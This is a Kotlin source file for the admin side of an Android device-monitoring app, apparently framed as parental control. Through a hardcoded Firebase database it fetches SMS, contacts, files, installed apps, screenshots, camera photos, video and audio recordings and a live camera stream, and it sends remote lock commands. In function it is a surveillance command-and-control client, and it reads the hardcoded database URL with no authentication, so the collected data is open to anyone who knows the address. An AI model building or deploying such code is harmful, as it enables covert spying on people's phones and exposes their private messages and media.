package com.example.admin

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException

class FirebaseAdminConnector {
    private val client = OkHttpClient()
    private var rootUrl = "https://studio-3242759193-af8cb-default-rtdb.firebaseio.com"

    fun updateRootUrl(url: String) {
        val trimmed = url.trim().removeSuffix("/")
        val withProtocol = if (!trimmed.startsWith("http://") && !trimmed.startsWith("https://") && trimmed.isNotEmpty()) {
            "https://$trimmed"
        } else {
            trimmed
        }
        rootUrl = withProtocol
    }

    fun getRootUrl(): String = rootUrl

    // Get all registered devices
    suspend fun getDiscoveredDevices(): List<Device> = withContext(Dispatchers.IO) {
        try {
            val request = Request.Builder()
                .url("$rootUrl/devices.json")
                .get()
                .build()
            val devicesList = mutableListOf<Device>()
            val foundKeys = mutableSetOf<String>()
            
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    val code = response.code
                    val message = response.message
                    val errorBody = response.body?.string() ?: ""
                    throw IOException("HTTP $code: $message / Details: $errorBody")
                }
                
                val bodyStr = response.body?.string()
                if (bodyStr != null && bodyStr != "null" && bodyStr.isNotBlank()) {
                    val trimmed = bodyStr.trim()
                    if (trimmed.startsWith("{")) {
                        val json = JSONObject(bodyStr)
                        val keys = json.keys()
                        while (keys.hasNext()) {
                            val key = keys.next()
                            if (key == "null" || key.isBlank()) continue
                            foundKeys.add(key)
                            val childObj = json.optJSONObject(key)
                            
                            val rawDeviceName = childObj?.optString("deviceName")?.takeIf { it.isNotBlank() && it != "null" }
                                ?: key
                            val deviceName = cleanDeviceName(rawDeviceName, key)
                            val battery = childObj?.optInt("battery", 90) ?: 90
                            val lastActive = childObj?.optLong("lastActive", 0L) ?: 0L
                            val storageUsed = childObj?.optLong("storageUsed", 4L * 1024 * 1024 * 1024) ?: (4L * 1024 * 1024 * 1024)
                            val storageTotal = childObj?.optLong("storageTotal", 64L * 1024 * 1024 * 1024) ?: (64L * 1024 * 1024 * 1024)
                            val isLocked = childObj?.optBoolean("isLocked", false) ?: false
                            val networkType = childObj?.optString("networkType")?.takeIf { it.isNotBlank() && it != "null" }
                            val isCharging = childObj?.optBoolean("isCharging", false) ?: false
                            
                            devicesList.add(
                                Device(
                                    id = key,
                                    name = deviceName,
                                    battery = battery,
                                    lastActive = lastActive,
                                    storageUsed = storageUsed,
                                    storageTotal = storageTotal,
                                    isLocked = isLocked,
                                    networkType = networkType,
                                    isCharging = isCharging
                                )
                            )
                        }
                    } else if (trimmed.startsWith("[")) {
                        val arr = JSONArray(bodyStr)
                        for (i in 0 until arr.length()) {
                            val childObj = arr.optJSONObject(i)
                            val key = childObj?.optString("id")?.takeIf { it.isNotBlank() } ?: "device_$i"
                            foundKeys.add(key)
                            val rawDeviceName = childObj?.optString("deviceName")?.takeIf { it.isNotBlank() && it != "null" }
                                ?: key
                            val deviceName = cleanDeviceName(rawDeviceName, key)
                            val battery = childObj?.optInt("battery", 90) ?: 90
                            val lastActive = childObj?.optLong("lastActive", 0L) ?: 0L
                            val storageUsed = childObj?.optLong("storageUsed", 4L * 1024 * 1024 * 1024) ?: (4L * 1024 * 1024 * 1024)
                            val storageTotal = childObj?.optLong("storageTotal", 64L * 1024 * 1024 * 1024) ?: (64L * 1024 * 1024 * 1024)
                            val isLocked = childObj?.optBoolean("isLocked", false) ?: false
                            val networkType = childObj?.optString("networkType")?.takeIf { it.isNotBlank() && it != "null" }
                            val isCharging = childObj?.optBoolean("isCharging", false) ?: false
                            
                            devicesList.add(
                                Device(
                                    id = key,
                                    name = deviceName,
                                    battery = battery,
                                    lastActive = lastActive,
                                    storageUsed = storageUsed,
                                    storageTotal = storageTotal,
                                    isLocked = isLocked,
                                    networkType = networkType,
                                    isCharging = isCharging
                                )
                            )
                        }
                    }
                }
            }
            
            // Auto-discover devices that might have nodes under other tables but aren't registered under /devices node:
            val extraTables = listOf(
                "commands", "sms", "screenshots", "camera_photos", "audio_records", 
                "live_stream", "installed_apps", "files", "security_alerts", "command_responses"
            )
            for (table in extraTables) {
                try {
                    val req = Request.Builder()
                        .url("$rootUrl/$table.json?shallow=true")
                        .get()
                        .build()
                    client.newCall(req).execute().use { resp ->
                        if (resp.isSuccessful) {
                            val bodyBytesStr = resp.body?.string()
                            if (bodyBytesStr != null && bodyBytesStr != "null" && bodyBytesStr.isNotBlank()) {
                                val json = JSONObject(bodyBytesStr)
                                val keys = json.keys()
                                while (keys.hasNext()) {
                                    val key = keys.next()
                                    if (key != "null" && !key.isNullOrBlank() && !foundKeys.contains(key)) {
                                        foundKeys.add(key)
                                        // Auto-discovered device with default starting values
                                        devicesList.add(
                                            Device(
                                                id = key,
                                                name = cleanDeviceName(key, key),
                                                battery = 95,
                                                lastActive = System.currentTimeMillis() - 10000, // active/online
                                                storageUsed = 4L * 1024 * 1024 * 1024,
                                                storageTotal = 64L * 1024 * 1024 * 1024,
                                                isLocked = false,
                                                networkType = "WiFi",
                                                isCharging = false
                                            )
                                        )
                                    }
                                }
                            }
                        }
                    }
                } catch(e: Exception) {
                    Log.e("FirebaseConnector", "Shallow fetch error for table: $table", e)
                }
            }
            
            return@withContext devicesList
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "General error fetching devices", e)
            throw e
        }
    }

    // Force updates lock status directly on Devices/token/isLocked
    suspend fun updateLockInDatabase(deviceToken: String, isLocked: Boolean): Boolean = withContext(Dispatchers.IO) {
        val url = "$rootUrl/devices/$deviceToken/isLocked.json"
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = isLocked.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .put(body)
            .build()
        try {
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error updating lock status on DB", e)
            return@withContext false
        }
    }

    // Create command under commands/token
    suspend fun sendCommandToChild(
        deviceToken: String, 
        commandType: String, 
        additionalParams: Map<String, Any> = emptyMap(),
        commandTimestamp: Long = System.currentTimeMillis()
    ): Boolean = withContext(Dispatchers.IO) {
        val commandId = commandTimestamp.toString()
        val url = "$rootUrl/commands/$deviceToken.json"
        
        val commandJson = JSONObject().apply {
            put("command", commandType)
            put("id", commandId)
            put("status", "pending")
            put("timestamp", commandTimestamp)
            additionalParams.forEach { (key, value) ->
                put(key, value)
            }
        }

        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = commandJson.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .put(body) // Overwrite to prevent backlog and trigger child sync instantly
            .build()

        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful && (commandType == "lock_device" || commandType == "unlock_device")) {
                    // Update the local isLocked state directly in Firebase for consistency
                    updateLockInDatabase(deviceToken, commandType == "lock_device")
                }
                return@withContext response.isSuccessful
            }
        } catch (e: IOException) {
            Log.e("FirebaseConnector", "Error sending command", e)
            return@withContext false
        }
    }

    // Clear command execution response before sending a new command
    suspend fun clearCommandResponse(deviceToken: String): Boolean = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/command_responses/$deviceToken.json")
            .delete()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error clearing command response", e)
            return@withContext false
        }
    }

    // Read the command execution response
    suspend fun getCommandResponse(deviceToken: String): Triple<String, String, Long>? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/command_responses/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                
                val rootJson = JSONObject(bodyStr)
                var latestObj: JSONObject? = null
                var latestTimestamp = 0L

                if (rootJson.has("status")) {
                    latestObj = rootJson
                } else {
                    val keys = rootJson.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = rootJson.optJSONObject(key) ?: continue
                        val ts = obj.optLong("timestamp", 0L)
                        if (ts >= latestTimestamp) {
                            latestTimestamp = ts
                            latestObj = obj
                        }
                    }
                }

                if (latestObj == null) return@withContext null

                val status = latestObj.optString("status", "unknown")
                val message = latestObj.optString("message", "")
                val cmdTs = latestObj.optLong("command_timestamp", 0L)
                return@withContext Triple(status, message, cmdTs)
            }
        } catch (e: Exception) {
            return@withContext null
        }
    }

    // Fetch sms logs from sms/$token
    suspend fun getSmsLogs(deviceToken: String): List<SmsLog> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/sms/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()

                val logs = mutableListOf<SmsLog>()
                // Parse either as Array or map of objects
                if (bodyStr.trim().startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        logs.add(parseSmsObject(i.toString(), obj))
                    }
                } else {
                    val json = JSONObject(bodyStr)
                    val keys = json.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = json.optJSONObject(key) ?: continue
                        logs.add(parseSmsObject(key, obj))
                    }
                }
                return@withContext logs.sortedByDescending { it.timestamp }
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error fetching SMS logs", e)
            return@withContext emptyList()
        }
    }

    private fun parseSmsObject(id: String, obj: JSONObject): SmsLog {
        return SmsLog(
            id = id,
            sender = obj.optString("sender", "Unknown"),
            body = obj.optString("body", ""),
            timestamp = obj.optLong("timestamp", System.currentTimeMillis()),
            type = obj.optString("type", "incoming")
        )
    }

    // Fetch security alerts from security_alerts/$token
    suspend fun getSecurityAlerts(deviceToken: String): List<SecurityAlert> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/security_alerts/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()

                val list = mutableListOf<SecurityAlert>()
                if (bodyStr.trim().startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(parseAlertObject(i.toString(), obj))
                    }
                } else {
                    val json = JSONObject(bodyStr)
                    val keys = json.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = json.optJSONObject(key) ?: continue
                        list.add(parseAlertObject(key, obj))
                    }
                }
                return@withContext list.sortedByDescending { it.timestamp }
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error fetching alerts", e)
            return@withContext emptyList()
        }
    }

    private fun parseAlertObject(id: String, obj: JSONObject): SecurityAlert {
        return SecurityAlert(
            id = id,
            title = obj.optString("title", "ALERT"),
            message = obj.optString("message", ""),
            timestamp = obj.optLong("timestamp", System.currentTimeMillis())
        )
    }

    // Delete security alerts node to clear
    suspend fun clearSecurityAlerts(deviceToken: String): Boolean = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/security_alerts/$deviceToken.json")
            .delete()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            return@withContext false
        }
    }

    // Fetch installed apps list from installed_apps/$token
    suspend fun getInstalledApps(deviceToken: String): List<InstalledApp> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/installed_apps/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()

                val apps = mutableListOf<InstalledApp>()
                if (bodyStr.trim().startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        apps.add(
                            InstalledApp(
                                name = obj.optString("name", "Unknown App"),
                                packageName = obj.optString("package", "com.example"),
                                isSystem = obj.optBoolean("isSystem", false)
                            )
                        )
                    }
                } else {
                    val json = JSONObject(bodyStr)
                    val keys = json.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = json.optJSONObject(key) ?: continue
                        apps.add(
                            InstalledApp(
                                name = obj.optString("name", "Unknown App"),
                                packageName = obj.optString("package", key),
                                isSystem = obj.optBoolean("isSystem", false)
                            )
                        )
                    }
                }
                return@withContext apps.sortedBy { it.name.lowercase() }
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error fetching apps list", e)
            return@withContext emptyList()
        }
    }

    // Fetch remote file list from files/$token
    suspend fun getFileSystem(deviceToken: String): List<FileItem> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/files/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()

                val items = mutableListOf<FileItem>()
                if (bodyStr.trim().startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        items.add(parseFileItem(obj))
                    }
                } else {
                    val json = JSONObject(bodyStr)
                    val keys = json.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = json.optJSONObject(key) ?: continue
                        items.add(parseFileItem(obj))
                    }
                }
                // Sort directories first, then alphabetically
                return@withContext items.sortedWith(compareBy<FileItem> { !it.isDir }.thenBy { it.name.lowercase() })
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error reading remote file tree", e)
            return@withContext emptyList()
        }
    }

    private fun parseFileItem(obj: JSONObject): FileItem {
        return FileItem(
            name = obj.optString("name", "Unknown File"),
            path = obj.optString("path", ""),
            isDir = obj.optBoolean("isDir", false),
            size = obj.optLong("size", 0L),
            date = obj.optString("date", "N/A")
        )
    }

    // Fetch ALL screenshots from screenshots/$token
    suspend fun getScreenshots(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/screenshots/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()
                
                val rootJson = JSONObject(bodyStr)
                val items = mutableListOf<MediaItem>()

                if (rootJson.has("image") || rootJson.has("base64")) {
                    val base64 = rootJson.optString("image", rootJson.optString("base64", ""))
                    if (base64.isNotBlank()) {
                        items.add(MediaItem(
                            id = "root",
                            base64 = base64,
                            timestamp = rootJson.optLong("timestamp", 0L),
                            type = "screenshot"
                        ))
                    }
                } else {
                    val keys = rootJson.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = rootJson.optJSONObject(key) ?: continue
                        val base64 = obj.optString("image", obj.optString("base64", ""))
                        if (base64.isNotBlank()) {
                            items.add(MediaItem(
                                id = key,
                                base64 = base64,
                                timestamp = obj.optLong("timestamp", 0L),
                                type = "screenshot"
                            ))
                        }
                    }
                }
                return@withContext items.sortedByDescending { it.timestamp }
            }
        } catch (e: Exception) {
            return@withContext emptyList()
        }
    }

    // Fetch ALL camera_photos/$token
    suspend fun getCameraPhotos(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/camera_photos/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()
                
                val rootJson = JSONObject(bodyStr)
                val items = mutableListOf<MediaItem>()

                if (rootJson.has("image") || rootJson.has("base64")) {
                    val base64 = rootJson.optString("image", rootJson.optString("base64", ""))
                    if (base64.isNotBlank()) {
                        val camera = if (rootJson.optBoolean("isFront", false)) "front" else rootJson.optString("camera", "back")
                        items.add(MediaItem(
                            id = "root",
                            base64 = base64,
                            timestamp = rootJson.optLong("timestamp", 0L),
                            type = "camera",
                            cameraType = camera
                        ))
                    }
                } else {
                    val keys = rootJson.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = rootJson.optJSONObject(key) ?: continue
                        val base64 = obj.optString("image", obj.optString("base64", ""))
                        if (base64.isNotBlank()) {
                            val camera = if (obj.optBoolean("isFront", false)) "front" else obj.optString("camera", "back")
                            items.add(MediaItem(
                                id = key,
                                base64 = base64,
                                timestamp = obj.optLong("timestamp", 0L),
                                type = "camera",
                                cameraType = camera
                            ))
                        }
                    }
                }
                return@withContext items.sortedByDescending { it.timestamp }
            }
        } catch (e: Exception) {
            return@withContext emptyList()
        }
    }

    // Fetch ALL video_records/$token
    suspend fun getCameraVideos(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/video_records/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()
                
                val rootJson = JSONObject(bodyStr)
                val items = mutableListOf<MediaItem>()

                if (rootJson.has("video") || rootJson.has("base64")) {
                    val base64 = rootJson.optString("video", rootJson.optString("base64", ""))
                    if (base64.isNotBlank()) {
                        val camera = if (rootJson.optBoolean("isFront", false)) "front" else rootJson.optString("camera", "back")
                        items.add(MediaItem(
                            id = "root",
                            base64 = base64,
                            timestamp = rootJson.optLong("timestamp", 0L),
                            type = "video",
                            cameraType = camera
                        ))
                    }
                } else {
                    val keys = rootJson.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = rootJson.optJSONObject(key) ?: continue
                        val base64 = obj.optString("video", obj.optString("base64", ""))
                        if (base64.isNotBlank()) {
                            val camera = if (obj.optBoolean("isFront", false)) "front" else obj.optString("camera", "back")
                            items.add(MediaItem(
                                id = key,
                                base64 = base64,
                                timestamp = obj.optLong("timestamp", 0L),
                                type = "video",
                                cameraType = camera
                            ))
                        }
                    }
                }
                return@withContext items.sortedByDescending { it.timestamp }
            }
        } catch (e: Exception) {
            return@withContext emptyList()
        }
    }

    // Fetch ALL audio_records/$token
    suspend fun getAudioRecords(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/audio_records/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()
                
                val rootJson = JSONObject(bodyStr)
                val items = mutableListOf<MediaItem>()

                if (rootJson.has("audio") || rootJson.has("base64")) {
                    val base64 = rootJson.optString("audio", rootJson.optString("base64", ""))
                    if (base64.isNotBlank()) {
                        items.add(MediaItem(
                            id = "root",
                            base64 = base64,
                            timestamp = rootJson.optLong("timestamp", 0L),
                            type = "audio"
                        ))
                    }
                } else {
                    val keys = rootJson.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = rootJson.optJSONObject(key) ?: continue
                        val base64 = obj.optString("audio", obj.optString("base64", ""))
                        if (base64.isNotBlank()) {
                            items.add(MediaItem(
                                id = key,
                                base64 = base64,
                                timestamp = obj.optLong("timestamp", 0L),
                                type = "audio"
                            ))
                        }
                    }
                }
                return@withContext items.sortedByDescending { it.timestamp }
            }
        } catch (e: Exception) {
            return@withContext emptyList()
        }
    }

    // Fetch contacts from contacts/$token
    suspend fun getContacts(deviceToken: String): List<Contact> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/contacts/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext emptyList()

                val contacts = mutableListOf<Contact>()
                if (bodyStr.trim().startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        contacts.add(
                            Contact(
                                id = i.toString(),
                                name = obj.optString("name", "Unknown"),
                                number = obj.optString("number", "")
                            )
                        )
                    }
                } else {
                    val json = JSONObject(bodyStr)
                    val keys = json.keys()
                    while (keys.hasNext()) {
                        val key = keys.next()
                        val obj = json.optJSONObject(key) ?: continue
                        contacts.add(
                            Contact(
                                id = key,
                                name = obj.optString("name", "Unknown"),
                                number = obj.optString("number", "")
                            )
                        )
                    }
                }
                return@withContext contacts.sortedBy { it.name.lowercase() }
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error fetching contacts list", e)
            return@withContext emptyList()
        }
    }

    // Delete a specific media item from Firebase
    suspend fun deleteMediaItem(deviceToken: String, category: String, itemId: String): Boolean = withContext(Dispatchers.IO) {
        // category should be "screenshots", "camera_photos", or "audio_records"
        val url = if (itemId == "root") {
            "$rootUrl/$category/$deviceToken.json"
        } else {
            "$rootUrl/$category/$deviceToken/$itemId.json"
        }
        
        val request = Request.Builder()
            .url(url)
            .delete()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error deleting media item $itemId", e)
            return@withContext false
        }
    }

    // Fetch live stream state from live_stream/$token
    suspend fun getLiveStreamState(deviceToken: String): LiveStreamState? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/live_stream/$deviceToken.json")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr == "null" || bodyStr.isBlank()) return@withContext null
                
                val json = JSONObject(bodyStr)
                val isActive = json.optBoolean("isActive", false)
                val image = json.optString("image", "")
                val timestamp = json.optLong("timestamp", 0L)
                val error = json.optString("error", "").let { if (it.isBlank() || it == "null") null else it }
                
                return@withContext LiveStreamState(
                    isActive = isActive,
                    image = if (image.isBlank()) null else image,
                    timestamp = timestamp,
                    error = error
                )
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error getting live stream state", e)
            return@withContext null
        }
    }

    // Listen to camera stream state from camera_stream/$token using Server-Sent Events (SSE) for realtime
    suspend fun listenToCameraStream(deviceToken: String, onUpdate: (CameraStreamState?) -> Unit) = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/camera_stream/$deviceToken.json")
            .header("Accept", "text/event-stream")
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext
                val source = response.body?.source()
                var currentEvent = ""
                // Initial state
                var currentState = CameraStreamState(isActive = false, image = null, cameraType = "back")
                
                while (source != null && !source.exhausted()) {
                    val line = source.readUtf8Line() ?: break
                    if (line.startsWith("event: ")) {
                        currentEvent = line.substring(7).trim()
                    } else if (line.startsWith("data: ")) {
                        val dataStr = line.substring(6).trim()
                        if (dataStr == "null") continue
                        if (currentEvent == "put" || currentEvent == "patch") {
                            try {
                                val json = JSONObject(dataStr)
                                val path = json.optString("path", "/")
                                val data = json.optJSONObject("data")
                                
                                if (path == "/") {
                                    if (data != null) {
                                        val isActive = if (data.has("isActive")) data.optBoolean("isActive", currentState.isActive) else currentState.isActive
                                        val image = if (data.has("image")) data.optString("image", "") else currentState.image
                                        val cameraType = if (data.has("cameraType")) data.optString("cameraType", currentState.cameraType) else currentState.cameraType
                                        val timestamp = if (data.has("timestamp")) data.optLong("timestamp", currentState.timestamp) else currentState.timestamp
                                        val error = if (data.has("error")) data.optString("error", "") else currentState.error
                                        
                                        currentState = CameraStreamState(
                                            isActive = isActive,
                                            image = if (image.isNullOrBlank()) null else image,
                                            cameraType = cameraType,
                                            timestamp = timestamp,
                                            error = if (error.isNullOrBlank()) null else error,
                                            isLoading = false
                                        )
                                        onUpdate(currentState)
                                    }
                                } else if (path == "/image") {
                                    val imageStr = json.optString("data", "")
                                    currentState = currentState.copy(image = if (imageStr.isBlank()) null else imageStr)
                                    onUpdate(currentState)
                                } else if (path == "/isActive") {
                                    currentState = currentState.copy(isActive = json.optBoolean("data", currentState.isActive))
                                    onUpdate(currentState)
                                }
                            } catch (e: Exception) {
                                Log.e("FirebaseConnector", "Error parsing SSE data", e)
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "SSE Stream Error", e)
        }
    }

     
    // Pairing simulation / Force pairing a simulation token
    suspend fun registerNewDeviceToken(deviceToken: String, deviceName: String): Boolean = withContext(Dispatchers.IO) {
        val url = "$rootUrl/devices/$deviceToken.json"
        val deviceJson = JSONObject().apply {
            put("deviceName", deviceName)
            put("battery", 85)
            put("lastActive", System.currentTimeMillis())
            put("storageUsed", 12L * 1024 * 1024 * 1024) // 12GB
            put("storageTotal", 64L * 1024 * 1024 * 1024) // 64GB
            put("isLocked", false)
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = deviceJson.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .put(body)
            .build()
        try {
            client.newCall(request).execute().use { response ->
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) {
            Log.e("FirebaseConnector", "Error manually connecting token", e)
            return@withContext false
        }
    }

    private fun cleanDeviceName(rawName: String, fallbackKey: String): String {
        var name = rawName.trim()
        // Remove "هاتف طفل", "جهاز طفل", "هاتف", "جهاز", "طفل"
        name = name.replace("هاتف طفل", "")
                   .replace("جهاز طفل", "")
                   .replace("هاتف", "")
                   .replace("جهاز", "")
                   .replace("طفل", "")
                   .trim()
        
        // Remove leading and trailing parentheses/brackets if they wrapping the name
        while ((name.startsWith("(") && name.endsWith(")")) || (name.startsWith("[") && name.endsWith("]"))) {
            name = name.substring(1, name.length - 1).trim()
        }
        
        // Remove leftover parentheses and brackets
        name = name.replace("(", "").replace(")", "").replace("[", "").replace("]", "").trim()
        
        if (name.isBlank() || name == "null") {
            var cleanedKey = fallbackKey.replace("(", "").replace(")", "").replace("[", "").replace("]", "").trim()
            if (cleanedKey.isBlank()) cleanedKey = "Device"
            return cleanedKey
        }
        return name
    }
}
